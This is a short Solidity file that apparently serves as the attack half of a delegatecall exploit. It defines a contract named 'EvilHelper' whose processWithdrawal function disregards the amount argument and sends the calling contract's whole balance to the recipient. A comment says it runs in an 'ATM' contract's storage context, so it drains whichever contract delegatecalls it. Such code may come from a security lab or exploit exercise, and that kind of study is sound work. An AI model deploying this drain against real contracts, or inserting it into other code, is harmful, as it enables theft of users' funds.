// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract EvilHelper {
    // runs in ATM storage context via delegatecall
    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
        (bool s, ) = recipient.call{value: address(this).balance}("");
        return s;
    }
}
